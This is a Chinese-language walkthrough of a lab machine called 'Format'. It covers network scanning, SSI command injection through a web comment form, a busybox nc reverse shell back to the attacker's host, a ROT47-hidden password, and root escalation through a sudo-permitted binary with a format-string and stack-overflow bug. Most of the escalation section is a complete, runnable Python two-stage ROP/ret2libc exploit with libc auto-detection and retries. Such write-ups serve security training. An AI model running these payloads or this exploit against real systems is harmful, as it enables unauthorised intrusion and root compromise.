# 信息收集

老规矩，先用 `arp-scan` 扫一下网段里的活靶子。

```bash
sudo arp-scan -l
```

很快就锁定了目标 IP `192.168.205.188`。

```
Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
192.168.205.131 00:0c:29:c3:54:95       VMware, Inc.
192.168.205.188 08:00:27:4e:d1:bc       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e0:e2:35       VMware, Inc.
...
```

接着 `nmap` 全端口扫描，看看上面跑了些什么服务。

```bash
nmap -p0-65535 192.168.205.188
```

结果很清爽，就开了 22 和 80 端口。SSH 先放着，Web 服务是首选突破口。

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-27 23:20 -0400
Nmap scan report for 192.168.205.188
Host is up (0.00033s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:4E:D1:BC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.03 seconds
```

# 初始突破：SSI 注入

直接用 `curl` 访问 80 端口，看看是什么页面。

```bash
curl http://192.168.205.188
```

返回一个看起来像系统监控后台的页面，风格很复古。

```html
<!DOCTYPE html>
<html>
<head>
    <title>Legacy Maintenance Console</title>
    ...
    <script>
        ...
            fetch('comments.shtml')
            .then(response => response.ok ? response.text() : '')
            .then(data => {
                const logBox = document.querySelector('.log-box');
                logBox.innerHTML = data ? `[${new Date().toLocaleString()}] ${data}` : '[2026-02-16 11:54:46] SYSTEM INITIALIZED<br>[2026-02-16 11:55:10] NODE CONNECTION VERIFIED';
            });
        ...
    </script>
</head>
<body>
    <div class="container">
        <h1>FORMAT - System Monitor v1.0.4</h1>
        ...
        <form action="post.php" method="POST">
            <p>Append Activity Log:</p>
            <textarea name="comment" rows="4"></textarea><br><br>
            <input type="submit" value="SUBMIT DATA">
        </form>
    </div>
</body>
</html>
```

源码里有几个关键点：

1. 页面通过 `fetch('comments.shtml')` 加载日志内容，主页本身也是 `.shtml` 后缀。这强烈暗示了服务器端包含（SSI）。
2. 有个表单，可以向 `post.php` 提交 `comment` 数据。

逻辑很清晰了：`post.php` 接收 `comment` 参数，然后把它写进 `comments.shtml` 文件里。既然是 `.shtml` 文件，那就有机会执行 SSI 指令。

直接构造一个 SSI payload，尝试执行 `id` 命令。

```bash
curl -X POST http://192.168.205.188/post.php --data-urlencode 'comment=<!--#exec cmd="id" -->'
```

提交之后，访问 `comments.shtml` 看看命令是否被执行。

```bash
curl http://192.168.205.188/comments.shtml
```

成功了，页面返回了 `id` 命令的执行结果。

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

既然能执行命令，下一步就是拿 shell。用 `busybox nc` 弹个反向 shell 回来。

```bash
curl -X POST http://192.168.205.188/post.php --data-urlencode 'comment=<!--#exec cmd="busybox nc 192.168.205.128 8888 -e /bin/bash" -->'
```

在 Kali 上开好监听。

```bash
nc -lvnp 8888
```

提交 payload 后，再访问一次 `comments.shtml` 来触发命令。

```bash
curl http://192.168.205.188/comments.shtml
```

监听端立刻收到了连接，拿到了一个 `www-data` 权限的 shell。

```
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.188] 55876
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

## www-data -> andeli

拿到 shell 后第一件事是搞个好用的终端。

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

在 Web 目录下翻翻，看看有什么线索。

```bash
www-data@Format:/var/www/html$ ls -la
total 20
drwxr-xr-x 2 root     root     4096 Feb 21 22:55 .
drwxr-xr-x 3 root     root     4096 Jan 30 09:21 ..
-rw-rw-rw- 1 www-data www-data   64 May 27 22:23 comments.shtml
-rw-r--r-- 1 root     root     2161 Feb 15 21:56 index.shtml
-rw-r--r-- 1 root     root      157 Feb 20 09:39 post.php
```

之前利用的 `post.php` 引起了我的注意，看看里面写了什么。

```bash
www-data@Format:/var/www/html$ cat post.php
<?php
$data = $_POST['comment'];
file_put_contents("comments.shtml", $data);
header("Location: index.shtml");
exit();
// rot47
// 2?56=:iC"tKHsKF6!@x}&&:
?>
```

代码逻辑很简单，就是把 POST 过来的 `comment` 数据写入文件。但下面注释里有个 `rot47` 和一串奇怪的字符，这明显是线索。

用 CyberChef 之类的工具，对 `2?56=:iC"tKHsKF6!@x}&&:` 做 ROT47 解码，得到一组凭据：`andeli:rQEzwDzuePoINUUi`。

尝试用这组凭据切换用户。

```bash
www-data@Format:/var/www/html$ su andeli
Password: 
andeli@Format:/var/www/html$ id
uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)
```

成功切换到 `andeli` 用户。

## andeli -> root

作为新用户，第一反应就是看看 `sudo -l` 有没有意外之喜。

```bash
andeli@Format:/var/www/html$ sudo -l
Matching Defaults entries for andeli on Format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User andeli may run the following commands on Format:
    (ALL) NOPASSWD: /usr/local/bin/format
```

`andeli` 可以免密以 root 权限执行 `/usr/local/bin/format`。接下来就是分析这个二进制了。

### format 二进制分析

> *ps:我拉到本地了，所以在本地调试*

先看基本属性。

```bash
file ./format
readelf -h ./format
readelf -l ./format
```

关键结论：

- ELF32 i386，小端，动态链接。
- `Type: EXEC`，无 PIE，程序本体地址固定在 `0x08048000` 附近。
- `GNU_STACK` 为 `RW`，没有执行权限，栈不可执行，得走 ret2libc/ROP。
- Partial RELRO，GOT 可写。

反编译得到的主函数伪代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char format[100]; // [esp+0h] [ebp-78h] BYREF
  int v5; // [esp+64h] [ebp-14h]
  int v6; // [esp+68h] [ebp-10h]
  int v7; // [esp+6Ch] [ebp-Ch]

  v7 = 1;
  v6 = 572662306;
  v5 = 1;
  __isoc99_scanf((int)&unk_8048560, (int)format);
  printf("%08x.%08x.%08x.%s\n", v7, v6, v5, format);
  printf(format);
  return 0;
}
```

`.rodata` 中 `0x08048560` 是 `"%s"`，所以就是 `scanf("%s", format)`。这里同时存在两个问题：

1. `scanf("%s")` 没有限制长度，`format[100]` 可被溢出。
2. `printf(format)` 直接把用户输入当格式串，存在格式化字符串漏洞。

### 栈迁移和利用原语

`main` 的关键汇编片段：

```asm
0804846b <main>:
 804846b: 8d 4c 24 04        lea    ecx,[esp+0x4]
 804846f: 83 e4 f0           and    esp,0xfffffff0
 8048472: ff 71 fc           push   DWORD PTR [ecx-0x4]
 8048475: 55                 push   ebp
 8048476: 89 e5              mov    ebp,esp
 8048478: 51                 push   ecx
 8048479: 83 ec 74           sub    esp,0x74
  ...
 80484d6: 8b 4d fc           mov    ecx,DWORD PTR [ebp-0x4]
 80484d9: c9                 leave
 80484da: 8d 61 fc           lea    esp,[ecx-0x4]
 80484dd: c3                 ret
```

`format` 缓冲区在 `[ebp-0x78]`，保存的 `ecx` 在 `[ebp-0x4]`，两者相差 `0x74 = 116` 字节。函数返回时执行 `lea esp, [ecx-4]; ret`，所以只要把保存的 `ecx` 改成 `.bss` 上的地址，就能把 `esp` 迁移过去，从 `.bss` 上取返回地址执行 ROP。

格式化字符串方面，`printf(format)` 只传了一个参数，但用户输入本身就在栈上。输入开头的 4 字节可以作为格式化字符串的第 4 个参数读取，所以能用 `%4$.4s` 做任意地址泄露，用 `%N$hn` 做任意地址半字写。

可用的三个原语：

1. **任意地址泄露**：把 GOT 地址放到输入中，用 `%4$.4s` 读出 4 字节。
2. **任意地址半字写**：把目标地址放到输入中，用 `%N$hn` 写入当前输出长度的低 16 位。
3. **栈迁移**：通过溢出覆盖保存的 `ecx`，让 `main` 返回时 `esp` 指向 `.bss` ROP 链。

### 两阶段 ROP 方案

由于 NX 开启，不能直接打 shellcode，最终方案是两阶段 ROP。

**Stage 1** —— 一次输入同时完成：

- 泄露 `__libc_start_main@got`（`0x0804a010`）和 `__isoc99_scanf@got`（`0x0804a014`）。
- 用格式化字符串 `%hn` 把第一段 ROP 链和一个 `" %[^\n]"` 格式串写到 `.bss`。
- 覆盖保存的 `ecx`，把返回路径 pivot 到 `.bss` 的 ROP 链上。

写入 `.bss` 的第一段 ROP 布局：

```text
ROP_SCRATCH + 0x00: scanf@plt
ROP_SCRATCH + 0x04: pop2_ret
ROP_SCRATCH + 0x08: SCANSET_FMT     (" %[^\n]" 的地址)
ROP_SCRATCH + 0x0c: CHAIN2_SCRATCH
ROP_SCRATCH + 0x10: pop_ebp_ret
ROP_SCRATCH + 0x14: CHAIN2_SCRATCH
ROP_SCRATCH + 0x18: leave_ret
```

执行效果就是 `scanf(" %[^\n]", CHAIN2_SCRATCH)`，然后把 `ebp` 设置到 `CHAIN2_SCRATCH`，再通过 `leave; ret` 切换到第二阶段链。

这里用 `" %[^\n]"` 而不是原程序里的 `"%s"` 是有讲究的——`%s` 遇到空白字符就截断，而 `" %[^\n]"` 会先跳过残留换行，再读取直到下一次换行，这样 stage2 payload 里基本只需要避开 `0x0a`。

脚本会用两个泄露值交叉校验 libc 基址：

```python
base1 = leak_libc_start_main - off_libc_start_main
base2 = leak_scanf - off_scanf
```

只有 `base1 == base2` 时才继续。

**Stage 2** —— 经典 ret2libc：

```python
payload = p32(0x41414141)          # fake ebp
payload += p32(system_addr)        # system
payload += p32(0x42424242)         # fake return
payload += p32(CHAIN2_SCRATCH + 16)  # arg -> "/bin/sh"
payload += b"/bin/sh"
```

第一阶段 ROP 执行 `scanf` 读入这段 payload 后，`leave; ret` 把控制流交给 `system("/bin/sh")`。因为 `format` 是通过 `sudo` 执行的，所以得到的就是 root shell。

### 利用执行

整个过程涉及地址计算、ASLR、ROP 链构建，手动操作很繁琐，所以写了一个 Python 脚本来自动化。脚本包含 libc 自动识别和 64 次重试逻辑，用来处理 ASLR 下偶发的地址坏字节问题。

> ps:有些本地测试的冗余代码可以del。自己解决一下吧，我没del。能跑的就是好代码。

```python
#!/usr/bin/env python3
import argparse
import re
import select
import socket
import struct
import subprocess
import sys
import time
from typing import Optional


GOT_LIBC_START_MAIN = 0x0804A010
GOT_SCANF = 0x0804A014

SCANF_PLT = 0x08048350
SCANF_FMT = 0x08048560
POP2_RET = 0x0804853A
POP_EBP_RET = 0x0804853B
LEAVE_RET = 0x080483D8

ROP_SCRATCH = 0x0804AF40
SCANSET_FMT = 0x0804AFA0
CHAIN2_SCRATCH = 0x0804AFC0
SAVED_ECX_OFFSET = 116

FALLBACK_LIBC_PROFILES = [
    {
        "name": "glibc-2.23-ubuntu16-i386",
        "off_libc_start_main": 0x18540,
        "off_scanf": 0x53D10,
        "off_system": 0x3A940,
        "off_exit": 0x2E7B0,
        "off_bin_sh": 0x15900B,
    },
    {
        "name": "glibc-2.31-ubuntu20-i386-local",
        "off_libc_start_main": 0x25F70,
        "off_scanf": 0x5B0A0,
        "off_system": 0x537F0,
        "off_exit": 0x400C0,
        "off_bin_sh": 0x1C8E52,
    },
]

LEAK_RE = re.compile(rb"L1(.{4})L2(.{4})L3STK([0-9a-fA-F]{8})STK", re.S)
BAD_STAGE1_BYTES = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
BAD_STAGE2_BYTES = b"\x0a"
DEFAULT_LOCAL_ARGV = ["sudo", "-n", "/usr/local/bin/format"]
TEST_LOCAL_ARGV = ["./format"]


def p32(value: int) -> bytes:
    return struct.pack("<I", value & 0xFFFFFFFF)


def u32(data: bytes) -> int:
    return struct.unpack("<I", data)[0]


def has_bad_bytes(data: bytes, bad_bytes: bytes) -> bool:
    return any(byte in bad_bytes for byte in data)


def parse_local_libc_profile(binary_path: str):
    ldd = subprocess.run(
        ["ldd", binary_path],
        check=True,
        capture_output=True,
        text=True,
    )

    libc_path = None
    for line in ldd.stdout.splitlines():
        if "libc.so.6" in line and "=>" in line:
            libc_path = line.split("=>", 1)[1].strip().split()[0]
            break
    if libc_path is None:
        raise RuntimeError(f"failed to locate libc for {binary_path}")

    readelf = subprocess.run(
        ["readelf", "-sW", libc_path],
        check=True,
        capture_output=True,
        text=True,
    )
    strings = subprocess.run(
        ["strings", "-a", "-tx", libc_path],
        check=True,
        capture_output=True,
        text=True,
    )

    profile = {"name": f"auto:{libc_path}"}
    symbol_patterns = {
        "off_libc_start_main": r"^\s*\d+:\s*([0-9a-fA-F]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\d+\s+__libc_start_main@@",
        "off_scanf": r"^\s*\d+:\s*([0-9a-fA-F]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\d+\s+__isoc99_scanf@@",
        "off_system": r"^\s*\d+:\s*([0-9a-fA-F]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\d+\s+system@@",
        "off_exit": r"^\s*\d+:\s*([0-9a-fA-F]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\d+\s+exit@@",
    }
    for key, pattern in symbol_patterns.items():
        match = re.search(pattern, readelf.stdout, re.M)
        if match is None:
            raise RuntimeError(f"failed to resolve {key} from {libc_path}")
        profile[key] = int(match.group(1), 16)

    bin_sh = re.search(r"^\s*([0-9a-fA-F]+)\s+/bin/sh$", strings.stdout, re.M)
    if bin_sh is None:
        raise RuntimeError(f"failed to resolve /bin/sh from {libc_path}")
    profile["off_bin_sh"] = int(bin_sh.group(1), 16)
    return profile


class LocalTube:
    def __init__(self, argv):
        self.proc = subprocess.Popen(
            argv,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
        )

    def send(self, data: bytes) -> None:
        assert self.proc.stdin is not None
        self.proc.stdin.write(data)
        self.proc.stdin.flush()

    def recv_until(self, predicate, timeout: float) -> bytes:
        assert self.proc.stdout is not None
        out = b""
        end = time.time() + timeout
        while time.time() < end:
            ready, _, _ = select.select([self.proc.stdout], [], [], 0.05)
            if ready:
                chunk = self.proc.stdout.read1(8192)
                if not chunk:
                    break
                out += chunk
                if predicate(out):
                    break
            elif self.proc.poll() is not None:
                break
        return out

    def recv_some(self, timeout: float) -> bytes:
        return self.recv_until(lambda _: False, timeout)

    def drain_quiet(self, quiet_time: float, max_time: float) -> bytes:
        assert self.proc.stdout is not None
        out = b""
        end = time.time() + max_time
        last_data = time.time()
        while time.time() < end:
            ready, _, _ = select.select([self.proc.stdout], [], [], 0.05)
            if ready:
                chunk = self.proc.stdout.read1(8192)
                if not chunk:
                    break
                out += chunk
                last_data = time.time()
            elif time.time() - last_data >= quiet_time:
                break
        return out

    def interactive(self) -> None:
        assert self.proc.stdin is not None and self.proc.stdout is not None
        try:
            while True:
                ready, _, _ = select.select([self.proc.stdout, sys.stdin.buffer], [], [])
                if self.proc.stdout in ready:
                    chunk = self.proc.stdout.read1(8192)
                    if not chunk:
                        break
                    sys.stdout.buffer.write(chunk)
                    sys.stdout.buffer.flush()
                if sys.stdin.buffer in ready:
                    data = sys.stdin.buffer.read1(8192)
                    if not data:
                        break
                    self.proc.stdin.write(data)
                    self.proc.stdin.flush()
        finally:
            self.close()

    def close(self) -> None:
        if self.proc.poll() is None:
            self.proc.kill()
            self.proc.wait()


class RemoteTube:
    def __init__(self, host: str, port: int):
        self.sock = socket.create_connection((host, port))
        self.sock.setblocking(False)

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def recv_until(self, predicate, timeout: float) -> bytes:
        out = b""
        end = time.time() + timeout
        while time.time() < end:
            ready, _, _ = select.select([self.sock], [], [], 0.05)
            if ready:
                chunk = self.sock.recv(8192)
                if not chunk:
                    break
                out += chunk
                if predicate(out):
                    break
        return out

    def recv_some(self, timeout: float) -> bytes:
        return self.recv_until(lambda _: False, timeout)

    def drain_quiet(self, quiet_time: float, max_time: float) -> bytes:
        out = b""
        end = time.time() + max_time
        last_data = time.time()
        while time.time() < end:
            ready, _, _ = select.select([self.sock], [], [], 0.05)
            if ready:
                chunk = self.sock.recv(8192)
                if not chunk:
                    break
                out += chunk
                last_data = time.time()
            elif time.time() - last_data >= quiet_time:
                break
        return out

    def interactive(self) -> None:
        try:
            while True:
                ready, _, _ = select.select([self.sock, sys.stdin.buffer], [], [])
                if self.sock in ready:
                    chunk = self.sock.recv(8192)
                    if not chunk:
                        break
                    sys.stdout.buffer.write(chunk)
                    sys.stdout.buffer.flush()
                if sys.stdin.buffer in ready:
                    data = sys.stdin.buffer.read1(8192)
                    if not data:
                        break
                    self.sock.sendall(data)
        finally:
            self.close()

    def close(self) -> None:
        self.sock.close()


def build_fmt_with_pivot(prefix_args, writes, pivot_value):
    items = []
    for addr, value in writes.items():
        items.append((addr, value & 0xFFFF))
        items.append((addr + 2, (value >> 16) & 0xFFFF))

    prefix = b"".join(p32(arg) for arg in prefix_args)
    prefix += b"".join(p32(addr) for addr, _ in items)

    buf = bytearray(prefix)
    printed = len(prefix)
    by_halfword = {}
    start_index = 4 + len(prefix_args)

    for index, (_, halfword) in enumerate(items, start=start_index):
        by_halfword.setdefault(halfword, []).append(index)

    inserted = False
    for halfword in sorted(by_halfword):
        def build_chunk(current_count: int) -> bytes:
            pad = (halfword - current_count) & 0xFFFF
            chunk = b""
            if pad:
                chunk += f"%{pad}c".encode()
            for arg_index in by_halfword[halfword]:
                chunk += f"%{arg_index}$hn".encode()
            return chunk

        chunk = build_chunk(printed)
        if not inserted and len(buf) + len(chunk) > SAVED_ECX_OFFSET:
            filler_len = SAVED_ECX_OFFSET - len(buf)
            if filler_len < 0:
                raise ValueError("pivot insertion missed saved ecx slot")
            buf.extend(b"B" * filler_len)
            buf.extend(p32(pivot_value))
            printed = (printed + filler_len + 4) & 0xFFFF
            inserted = True
            chunk = build_chunk(printed)

        buf.extend(chunk)
        printed = halfword

    if not inserted:
        filler_len = SAVED_ECX_OFFSET - len(buf)
        if filler_len < 0:
            raise ValueError("format payload overflowed saved ecx slot")
        buf.extend(b"B" * filler_len)
        buf.extend(p32(pivot_value))

    if has_bad_bytes(buf, BAD_STAGE1_BYTES):
        raise ValueError("stage1 payload contains scanf-terminating bytes")
    return bytes(buf)


def build_stage1() -> bytes:
    rop_writes = {
        ROP_SCRATCH: SCANF_PLT,
        ROP_SCRATCH + 4: POP2_RET,
        ROP_SCRATCH + 8: SCANSET_FMT,
        ROP_SCRATCH + 12: CHAIN2_SCRATCH,
        ROP_SCRATCH + 16: POP_EBP_RET,
        ROP_SCRATCH + 20: CHAIN2_SCRATCH,
        ROP_SCRATCH + 24: LEAVE_RET,
        SCANSET_FMT: 0x5E5B2520,
        SCANSET_FMT + 4: 0x00005D0A,
    }
    fmt = build_fmt_with_pivot([GOT_LIBC_START_MAIN, GOT_SCANF], rop_writes, ROP_SCRATCH + 4)
    fmt += b"L1%4$.4sL2%5$.4sL3STK%1$08xSTK%50000c"
    if fmt[SAVED_ECX_OFFSET:SAVED_ECX_OFFSET + 4] != p32(ROP_SCRATCH + 4):
        raise ValueError("saved ecx pivot not placed correctly")
    return fmt + b"\x00\n"


def build_stage2_chain(libc_base: int, profile) -> bytes:
    system_addr = libc_base + profile["off_system"]
    shell_str_addr = CHAIN2_SCRATCH + 16

    payload = p32(0x41414141)
    payload += p32(system_addr)
    payload += p32(0x42424242)
    payload += p32(shell_str_addr)
    payload += b"/bin/sh"

    if has_bad_bytes(payload, BAD_STAGE2_BYTES):
        sys.stderr.write(
            "[!] bad stage2 bytes: "
            f"system=0x{system_addr:08x}, shell_str=0x{shell_str_addr:08x}, "
            f"payload={payload.hex()}\n"
        )
        sys.stderr.flush()
        return b""
    return payload + b"\n"


def exploit_once(tube, libc_profiles, post_cmd: Optional[bytes] = None) -> bool:
    tube.send(build_stage1())
    leak_blob = tube.recv_until(lambda data: LEAK_RE.search(data) is not None, timeout=10.0)
    match = LEAK_RE.search(leak_blob)
    if not match:
        raise RuntimeError("failed to capture stage1 leaks")

    leak_libc_start_main = u32(match.group(1))
    leak_scanf = u32(match.group(2))
    stack_buf = int(match.group(3), 16)
    sys.stderr.write(
        f"[+] raw leaks: __libc_start_main=0x{leak_libc_start_main:08x}, "
        f"__isoc99_scanf=0x{leak_scanf:08x}, stack_buf=0x{stack_buf:08x}\n"
    )
    sys.stderr.flush()

    matched_profile = None
    libc_base = None
    for profile in libc_profiles:
        base1 = leak_libc_start_main - profile["off_libc_start_main"]
        base2 = leak_scanf - profile["off_scanf"]
        if base1 == base2:
            matched_profile = profile
            libc_base = base1
            break

    if matched_profile is None:
        bases = []
        for profile in libc_profiles:
            base1 = leak_libc_start_main - profile["off_libc_start_main"]
            base2 = leak_scanf - profile["off_scanf"]
            bases.append(
                f"{profile['name']}: main=0x{base1:08x}, scanf=0x{base2:08x}"
            )
        raise RuntimeError("libc base mismatch between leaks; candidates: " + " | ".join(bases))

    sys.stderr.write(
        f"[+] libc profile = {matched_profile['name']}, libc_base = 0x{libc_base:08x}\n"
    )
    sys.stderr.flush()

    stage2 = build_stage2_chain(libc_base, matched_profile)
    if not stage2:
        sys.stderr.write("[-] stage2 contains scanf-terminating bytes, retrying\n")
        sys.stderr.flush()
        return False

    tube.send(stage2)
    time.sleep(1.0)
    tube.drain_quiet(quiet_time=0.2, max_time=3.0)
    if post_cmd is not None:
        marker = b"__CMD_DONE_5f31e7__"
        wrapped = b"{ " + post_cmd + b"; }; printf '" + marker + b"\\n'; exit\n"
        tube.send(wrapped)
        output = tube.recv_until(lambda data: marker in data, timeout=5.0)
        if marker in output:
            output = output.split(marker, 1)[0]
        sys.stdout.buffer.write(output)
        sys.stdout.buffer.flush()
        return True
    tube.interactive()
    return True


def exploit_local(argv, attempts: int = 64, post_cmd: Optional[bytes] = None) -> None:
    last_error = None
    binary_path = argv[-1]
    libc_profiles = []
    try:
        auto_profile = parse_local_libc_profile(binary_path)
        libc_profiles.append(auto_profile)
        sys.stderr.write(f"[+] auto libc profile: {auto_profile['name']}\n")
        sys.stderr.flush()
    except Exception as exc:
        sys.stderr.write(f"[-] auto libc parse failed for {binary_path}: {exc}\n")
        sys.stderr.flush()
    libc_profiles.extend(FALLBACK_LIBC_PROFILES)

    for attempt in range(1, attempts + 1):
        sys.stderr.write(f"[+] attempt {attempt}/{attempts}: {' '.join(argv)}\n")
        sys.stderr.flush()
        tube = LocalTube(argv)
        try:
            if exploit_once(tube, libc_profiles, post_cmd=post_cmd):
                return
        except Exception as exc:
            last_error = exc
            sys.stderr.write(f"[-] attempt {attempt} failed: {exc}\n")
            sys.stderr.flush()
        finally:
            try:
                tube.close()
            except Exception:
                pass
    if last_error is not None:
        raise last_error
    raise RuntimeError("exhausted attempts without a usable stage2 chain")


def exploit_remote(host: str, port: int, post_cmd: Optional[bytes] = None) -> None:
    tube = RemoteTube(host, port)
    try:
        if not exploit_once(tube, FALLBACK_LIBC_PROFILES, post_cmd=post_cmd):
            raise RuntimeError("remote run hit scanf-terminating bytes in stage2; reconnect and retry")
    finally:
        try:
            tube.close()
        except Exception:
            pass


def parse_args():
    parser = argparse.ArgumentParser(description="Exploit the vulnerable format binary")
    parser.add_argument("--local", action="store_true", help="use ./format instead of sudo /usr/local/bin/format")
    parser.add_argument("--cmd", help="send one command after shell spawn, then print its output")
    parser.add_argument("host", nargs="?")
    parser.add_argument("port", nargs="?")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    post_cmd = args.cmd.encode() if args.cmd is not None else None

    if args.host is None and args.port is None:
        exploit_local(TEST_LOCAL_ARGV if args.local else DEFAULT_LOCAL_ARGV, post_cmd=post_cmd)
    elif args.host is not None and args.port is not None and not args.local:
        exploit_remote(args.host, int(args.port), post_cmd=post_cmd)
    else:
        print(f"usage: {sys.argv[0]} [--local] [--cmd COMMAND] [HOST PORT]", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

将脚本上传到目标机器的 `/tmp` 目录，直接运行。

```bash
python3 exploit.py
```

脚本默认会调用 `sudo -n /usr/local/bin/format`，自动完成两阶段 ROP 攻击。

```
[+] auto libc profile: auto:/lib/i386-linux-gnu/libc.so.6
[+] attempt 1/64: sudo -n /usr/local/bin/format
[+] raw leaks: __libc_start_main=0xf7dd4540, __isoc99_scanf=0xf7e2ad10, stack_buf=0xffc678ac
[+] libc profile = auto:/lib/i386-linux-gnu/libc.so.6, libc_base = 0xf7dba000
# id
uid=0(root) gid=0(root) groups=0(root)
```

一发入魂，root shell 到手。